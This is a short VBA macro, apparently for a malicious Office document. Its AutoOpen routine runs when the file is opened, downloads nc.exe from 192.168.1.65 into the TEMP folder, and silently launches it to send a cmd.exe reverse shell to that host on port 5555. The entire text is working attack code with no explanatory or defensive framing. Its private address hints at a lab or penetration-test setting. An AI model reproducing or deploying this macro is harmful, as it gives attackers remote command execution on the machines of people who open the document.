Sub AutoOpen()
    Dim strUrl As String
    Dim strPath As String
    strUrl = "http://192.168.1.65/nc.exe"
    strPath = Environ("TEMP") & "\nc.exe"

    ' Download nc.exe
    With CreateObject("Microsoft.XMLHTTP")
        .Open "GET", strUrl, False
        .Send
        If .Status = 200 Then
            Set oStream = CreateObject("ADODB.Stream")
            oStream.Open
            oStream.Type = 1
            oStream.Write .ResponseBody
            oStream.SaveToFile strPath, 2
            oStream.Close
        End If
    End With

    ' Execute silently
    Shell "cmd.exe /c " & strPath & " 192.168.1.65 5555 -e cmd.exe", vbHide
End Sub
